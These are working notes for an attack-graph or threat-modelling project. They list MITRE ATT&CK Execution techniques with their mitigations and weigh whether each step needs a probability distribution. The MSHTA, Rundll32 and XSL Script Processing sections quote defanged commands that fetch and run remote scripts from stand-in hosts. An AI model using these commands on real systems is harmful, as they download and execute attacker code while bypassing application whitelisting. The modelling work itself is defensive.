# Execution Tactic (Work in Progress)

## This table lists all execution techniques with theur parents, children and mitigations in order to assess which ones need a probability distribution

|ID| Name|	Description| Parents | Children |Mitigations | Needs probability? |
|---|---|---|---|---|---|---|
|T1155	|AppleScript| macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the osalang program.| userRights |executeCode,inputPrompt  |codeSigning| No (there is one for codeSigning) |
|T1191	|CMSTP |The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.|userRights|bypassUserAccountControl, bypassApplicationWhitelisting, bypassAntivirus| executionPrevention, disableOrRemoveFeatureOrProgram|No (find one for disableOrRemoveFeatureOrProgram) |
|T1059|	Command-Line Interface	| Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. Scheduled Task). |dynamicDataExchange, userRights/adminRights|dataCollected, obfuscatedFilesOrInformation|executionPrevention|Yes|
|T1223	|Compiled HTML File| Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. CHM content is displayed using underlying components of the Internet Explorer browser loaded by the HTML Help executable program (hh.exe).|userRights|computer.user.attemptUserExecution, bypassApplicationWhitelisting, bypassDigitalCertificateValidation |restrictWebBasedContent, executionPrevention|No (userExecution)|
|T1175	|Component Object Model and Distributed COM	| Adversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. |user/admin/systmRights, | computer.router.internalNetwork.remoteCOMExecution|applicationIsolationAndSandboxing, privilegedAccountManagement, disableOrRemoveFeatureOrProgram, networkSegmentation |Yes|
|T1196	|Control Panel Items| Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. |user/admin/systemRights, spearPhishingAttachment|executeCode, bypassApplicationWhitelisting, bypassProcessWhitelisting|executionPrevention, restrictFileAndDirectoryPermissions|Yes| 
|T1173	| Dynamic Data Exchange	 |Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution. |registryKeysEnabled, distributedComponentObjectModel, infectedWindowsComputer |userCommandLineInterface| applicationIsolationAndSandboxing, behaviorPreventionOnEndpoint, disableOrRemoveFeatureOrProgram, softwareConfiguration,   | Yes |
|T1106 |	Execution through API	| Adversary tools may directly use the Windows application programming interface (API) to execute binaries. Functions such as the Windows API CreateProcess will allow programs and scripts to start other processes with proper path and argument parameters. |user/admin/systemRights, |NONE ??? (shouldn't it be executeCode, process injection?)|executionPrevention| Maybe not |
|T1129	| Execution through Module Load| The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API.|userRights|executeCode|executionPrevention |Yes|
|T1203|	Exploitation for Client Execution| Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.|antivirusCheck (but this also gives userExecution??), scripting, OTHER PARENTS ARE MENTIONED IN THE MITRE FRAMEWORK AND NOT IMPLEMENTED (Initial Access ones notably) |os.computer.user.attemptUserExecution |exploitProtection, applicationIsolationAndSandboxing|No|
|T1061|	Graphical User Interface	|The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as Remote Desktop Protocol, instead of through a Command-Line Interface, to search for information and execute files via mouse double-click events, the Windows Run command , or other potentially difficult to monitor interactions.|validAccounts, user/admin/systemRights|windows.remoteDesktopProtocol (SHOULDN'T IT BE A PARENT ACCORDING TO THE FRAMEWORK WITH CLI AS CHILD?), windows.attemptSystemFirmware|None|No|
|T1118	| InstallUtil	| InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. InstallUtil is located in the .NET directories on a Windows system: C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe and C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe. InstallUtil.exe is digitally signed by Microsoft. |userRights|bypassDigitalCertificateValidation, bypassProcessWhitelisting, signedBinaryProxyExecution, signedScriptProxyExecution|executionPrevention, disableOrRemoveFeatureOrProgram|No|
| T1152| 	Launchctl | Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made . Running a command from launchctl is as simple as launchctl submit -l -- /Path/to/thing/to/execute "arg" "arg" "arg". Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges.|user/admin/systemRights, |executeCode, bypassApplicationWhitelisting, bypassProcessWhitelisting, bypassFileOrPathWhitelisting | userAccountManagement|No|
|T1168|	Local Job Scheduling	| On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, at, and launchd. Unlike Scheduled Task on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH). |user/admin/systemRights|persistence, adminRights |userAccountManagement|No|
|T1177|	LSASS Driver|The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.|admin/systemRights|executeCode, persistence|codeSigning, credentialAccessProtection, restrictLibraryLoading |Maybe|
|T1170|	Mshta	|Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.|UserRights|executeCode, bypassDigitalCertificateValidation, bypassApplicationWhitelisting|disableOrRemoveFeatureOrProgram, executionPrevention|No|
|T1086	| PowerShell | PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer.|user/adminRights, inputPrompt, infectedcomputer |computer.router.internalNetwork.remoteSystemsConnection, os.computer.router.externalNetwork.attemptTransmittedDataManipulation, persistence|privilegedAccountManagement, codeSigning, disableOrRemoveFeatureOrProgram|Maybe (check if mitigations can take it)|
|T1121|	Regsvcs/Regasm	|Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft.|user/adminRights|codeProxyExecution,  bypassProcessWhitelisting, bypassDigitalCertificateValidation|disableorremovefeatureorprogram,executionprevention|No|
|T1117|	Regsvr32	|Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. |user/adminRights|bypassProcessWhitelisting, bypassAntivirus,  bypassDigitalCertificateValidation, codeProxyExecution, persistence| exploitProtection |No|
|T1085|	Rundll32|The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.|userRights|bypassAntivirus, bypassApplicationWhitelisting,  bypassDigitalCertificateValidation, executeCode|exploitProtection|Maybe not|
|T1053	| Scheduled Task|Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system.|groupPolicyModification, NOT UP TO DATE? user/system/adminRights, systemTimeDiscovery| NOT UP TO DATE| audit, operatingSystemConfiguration, privilegedAccountManagement, userAccountManagement |Maybe|
|T1064	|Scripting| Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts. |userRights, userExecution, windowsManagementInstrumentation, attemptPowerShell, queryRegistery |(sensitive)dataCollected, service.browser.spearphishingAttachment, service.exploitationForClientExecution, windows.virtualizationOrSandboxEvasion,  windows.templateInjection||maybe not (see userExecution and spearphishing)|
| T1035| Service Execution|	Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with New Service and Modify Existing Service during service persistence or privilege escalation.|admin/systemRights, modifyExistingService, groupPolicyModification |newService|priviledgedAccountManagement, restrictFileAndDirectoryPermissions|No|
|T1218	| Signed Binary Proxy Execution	|Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.|trustedDeveloperUtilities, userRights, installUtil |bypassApplicationWhitelisting, bypassDigitalCertificateValidation |executionPrevention|Yes|
|T1216|	Signed Script Proxy Execution	|Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.| trustedDeveloperUtilities, userRights, installUtil | bypassApplicationWhitelisting, bypassDigitalCertificateValidation |executionprevention|Yes|
|T1153|	Source|The source command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways source /path/to/filename [arguments] or . /path/to/filename [arguments]. Take note of the space after the ".". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.|userRights | executeCode|None|Maybe not|
|T1151	|Space after Filename	|Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to "evil.txt " (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed . |userRights|attemptuserExecution|None|Yes |
|T1072	| Third-party Software |Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an adversary gains access to these systems, then they may be able to execute code.|user/admin/systemRights, exploitationForPrivilegeEscalation|executeCode| userTraining, Active Directory Configuration, Multi-factor Authentication,   Network Segmentation, Password Policies, Privileged Account Management, Remote Data Storage, Update Software, User Account Management,|Yes |
|T1154	|Trap	| The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where "command list" will be executed when "signals" are received. |user/adminRights|executeCode, persistence|None|Yes |
|T1127	|Trusted Developer Utilities|There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.|userRights|bypassApplicationWhitelisting,  executeCode, signedBinaryProxyExecution, signedScriptProxyExecution| disableOrRemoveFeatureOrProgram, executionPrevention|No|
|T1204	|User Execution|An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via Spearphishing Attachment with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via Spearphishing Link that leads to exploitation of a browser or application vulnerability via Exploitation for Client Execution. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.|attemptUserExecution (lots of OR parents) |os.computer.infectedComputer,   os.computer.infectedWindowsComputer, os.scripting|userTraining (NOT SURE IF UP TO DATE BECAUSE SOME OR PARENTS ARE LOCKED BEHIND THE SAME MITIGATIONS)|No|
|T1047|	Windows Management Instrumentation|Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) and Remote Procedure Call Service (RPCS) for remote access. RPCS operates over port 135.|user/admin/systemRights, windowsAdminShares, xslScriptProcessing|systemInformationDiscovery, scripting,  executeCode, inhibitSystemRecovery|userAccountManagement, priviledgedAccountManagement|Yes |
|T1028|	Windows Remote Management	|Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell.|user/adminRights, attemptPowershell, sIDHistoryInjection|computer.router.internalNetwork.remoteExecution, service.externalRemoteServices|priviledgedAccountManagement|Maybe or Maybe not (Powershell has distribution but not attemptPowershell)|
|T1220|	XSL Script Processing	|Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.|userRights|executeCode, windowsManagementInstrumentation, bypassAntivirus, bypassApplicationWhitelisting, bypassDigitalCertificateValidation|executionPrevention|Yes|

## Probability assessment

### Apple Script 

The osascript command can be run on any MacOS computer with userRights with no restriction. Its only mitigation is codeSigning for which we have a probability distribution.

According to this book (https://books.google.fr/books?id=gtDaDwAAQBAJ&pg=PA288&lpg=PA288&dq=applescript+osascript+attack+likelihood+of+exploit&source=bl&ots=nfXtZW4Qgy&sig=ACfU3U0L1Zl5eJeILZq3Oa9kY7eFgwgRaQ&hl=fr&sa=X&ved=2ahUKEwjLuceht4PqAhVtyoUKHQhNAH8Q6AEwAXoECAoQAQ#v=onepage&q=applescript%20osascript%20attack%20likelihood%20of%20exploit&f=false), exploiting the osascript command to executeCode or inputPrompt can be done in seconds.

We assessed this probability distribution to be binary.

### CMSTP 

The CMSTP.exe command can be run with userRights with no restriction as long as it's enabled on the user session (which it is by default).

https://oddvar.moe/2017/08/15/research-on-cmstp-exe/ 
A number of exploits can be run in minutes if not seconds according to this research. 

We assessed this probability distribution to be binary.


### Command-Line Interface

This interface can be opened instantly with any rights and no restriction, if the user has access to direct command line interface.
https://attack.mitre.org/techniques/T1173/ this apparently isn't always the case (as suggested in the DDE attack step) so this might need a probability distribution.

This needs a probability distribution

### Compiled HTML File 

https://attack.mitre.org/techniques/T1223/
Adversaries may abuse Compiled HTML File to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe.

According to the MITRE ATT&CK framework, the delivered payload needs to be executed by the user. However, delivering payload isn't a problem so Compiled HTML File doesn't need a probability distribution. The probability will be supported by the User Execution step.



### Component Object Model and Distributed COM (needs?)

Both need a probability distribution.

### Control Panel Items (needs)

Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via Spearphishing Attachment campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting. The success rate of this attack is based on the success rate of the delivery so this attack step doesn't need a success probability

https://github.com/mantvydasb/RedTeam-Tactics-and-Techniques/blob/master/offensive-security/code-execution/t1196-control-panel-item-code-execution.md
https://pentestlab.blog/tag/control-panel/
However this attack can only be performed if the Control Panel is opened which might take some time.

This needs a probability distribution (how often do people open Control Panel). Maybe the adversary can trigger or display something that encourages the user to open Control Panel .

### Dynamic Data Exchange (needs)

Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.

Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands [4] [5], directly or through embedded files [6], and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. [7] DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.

[4] 
https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/
[5]
https://www.contextis.com/us/blog/comma-separated-vulnerabilities
[6]
https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee
[7]
https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
Users have to first try to open the files and then click on prompts for the attack to be successful.

This needs a time distribution (time before user opening/clicking). Both the | parents need a probability distribution too (Bernoulli prevalence)


### Execution Through API 

Windows API calls that can be used to execute binaries include: 
CreateProcessA() and CreateProcessW(),
CreateProcessAsUserA() and CreateProcessAsUserW(),
CreateProcessInternalA() and CreateProcessInternalW(),
CreateProcessWithLogonW(), CreateProcessWithTokenW(),
LoadLibraryA() and LoadLibraryW(),
LoadLibraryExA() and LoadLibraryExW(),
LoadModule(),
LoadPackagedLibrary(),
WinExec(),
ShellExecuteA() and ShellExecuteW(),
ShellExecuteExA() and ShellExecuteExW()

This one probably doesn't need a probability distribution because processInjection already has one and executeCode is a binary one.

### Execution Through Module Load  (needs)

https://attack.mitre.org/techniques/T1129/
This functionality resides in NTDLL.dll and is part of the Windows Native API. 
Adversaries can use this functionality as in different ways  to execute arbitrary code on a system.

This needs a probability distribution.

### Exploitation for Client Execution

https://attack.mitre.org/techniques/T1203/
This attack step relies on various intialAccess steps which all have a probability distribution. (these arent implemented yet though and the parents look weird)

We assessed this probability distribution to be binary.

### Graphical User Interface 

This feature is available in any computer and can be obtained via remote tools with no restriction.

We assessed this probability distribution to be binary.

### InstallUtil 

The installUtil command may be executed with userRights and no restriction, without relying on userExecution, as long as it's enabled on the system. It's signed by Microsoft.

Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)].

https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
Exploits can be performed in seconds by a professional adversary.

We assessed this probability distribution to be binary. 

### Launchctl 

Adversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.

This command can be executed and exploited with no restriction and user rights if the user account management isn't properly done. The only mitigation for this attack is userAccountManagement, for which we should find a probability distribution. If we do, the launchctl attackStep won't need a probability distribution.

We could then assess this probability distribution to be binary.

### Local Job Scheduling 
https://attack.mitre.org/techniques/T1168/
This functionality can be exploited with no restriction and user rights if the user account management isn't properly done. The only mitigation for this attack is userAccountManagement, for which we should find a probability distribution. If we do, the Local Job Scheduling attackStep won't need a probability distribution.

We could then assess this probability distribution to be binary.

### LSASS_Driver (needs???)

Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., DLL Side-Loading or DLL Search Order Hijacking), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.

### MSHTA

Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code.

Files may be executed by mshta.exe through an inline script: ``mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))``

They may also be executed directly from URLs:`` mshta http[:]//webserver/payload[.]hta``

Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.

The mshta.exe command can be executed with userRights and no restriction as long as it is enabled on the user session. 

https://www.hackingarticles.in/bypass-application-whitelisting-using-mshta-exe-multiple-methods/
Exploits can be performed in minutes if not seconds so this attack step might be considered as instantenous.

If we can find a probability distribution for the disableOrRemoveFeatureOrProgram mitigation, we could then assess this probability distribution to be binary. 

Love found a probability for this step. Should we consider it as the probability for the mitigations to be enabled or the probability of success?


### Powershell

Probability found by Love.
https://www.researchgate.net/publication/262327083_Aggregating_vulnerability_metrics_in_enterprise_networks_using_attack_graphs

### Regsvcs/Regasm
Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. [3][4]

[3]
https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/
[4]
https://lolbas-project.github.io/lolbas/Binaries/Regasm/
This command can be exploited in seconds with no privilege as long as it is enabled on the user session.

We assessed this probability distribution to be binary.

### Regsvr32

Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments.

Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via Component Object Model Hijacking. 

https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/
This exploit can be performed in seconds with user/adminRights and no restriction, and requires exploitProtection to be mitigated.

We assessed this probability distribution to be binary.

### Rundll32

Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. 
ADD CONTROLPANELITEM TO THE CHILDREN

Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: ``rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"`` This behavior has been seen used by malware such as Poweliks.

https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/
The ControlPanelItems will be provided a probability distribution and the scripts can be executed in minutes if not seconds with userRights and no restriciton.

We assessed this probability distribution to be binary.

### Scheduled Task

Probability found by Love (check mitigations).

### Scripting 

Probability found by Love (check mitigations).

### Service Execution

Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with New Service and Modify Existing Service during service persistence or privilege escalation.

This service can be mitigated by Privileged Account Management and restrictFileAndDirectoryPermissions which should both be provided with a probability distribution.

We assessed this probability distribution to be binary.

### Signed Binary Proxy Execution

https://attack.mitre.org/techniques/T1218/
Plenty of exploits can be run in no time in order to perform this attack steps with only UserRights

These might need a probability distribution.

###  Signed Script Proxy Execution

These might need a probability distribution.


### Source

Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.

The dot operator is available to any user, provided they have access to command line interface.

We assessed this probability distribution to be binary.

### Space after filename

Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to "evil.txt " (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed.

Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.

This attack step can be performed by any adversary without specific requirements and abuses system features. However, it requires the user to double click the file

This needs a time distribution (time it takes for the user to doubleclick)

### Third Party Software

Adversaries may gain access to and use third-party systems installed within an enterprise network, such as administration, monitoring, and deployment systems as well as third-party gateways and jump servers used for managing other systems. Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.

The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.

This needs a probability distribution.

### Trap 

The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where "command list" will be executed when "signals" are received.

This needs a time distribution for the time it'll take for the user to execute the interrupt command. The adversary may trap the most commonly used commands and based on how often people execute them on average we can find a probability distribution.

### Trusted Developer Utilities

There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.

If the utuilities are trusted and enabled, the attack will always be instantly successful (the exploits presented in the mitre framework can be performedm din no time)

We assessed this probability distribution to be binary.


### UserExecution

UserExecution might not need a time to compromise (the TTC may vary depending on specific attack steps and should be assessed for each of them specifically).

Probability distribution found by Lina.


### Windows Management Instrumentation 

Probability found by Love (check mitigations).

### XSL Script Processing

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to Trusted Developer Utilities, the Microsoft common line transformation utility binary (msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.  Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.

Command-line examples:

msxsl.exe customers[.]xml script[.]xsl
msxsl.exe script[.]xsl script[.]xsl
msxsl.exe script[.]jpeg script[.]jpeg
Another variation of this technique, dubbed "Squiblytwo", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its Regsvr32/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.

Command-line examples:

Local File: wmic process list /FORMAT:evil[.]xsl
Remote File: wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"

This needs a probability distribution in order to assess the prevalance of the adversary being able to install msxsl.exe on the user session. This doesn't need a Time To Compromise (exploit can be performed in no time)


## Mitigations that need a probability distribution

Find a probability distribution for disableOrRemoveFeatureOrProgram,restrictFileAndDirectoryPermissions, userAccountManagement, exploitProtection, behaviorPreventionOnEndpoint?

### Privileged Account Management

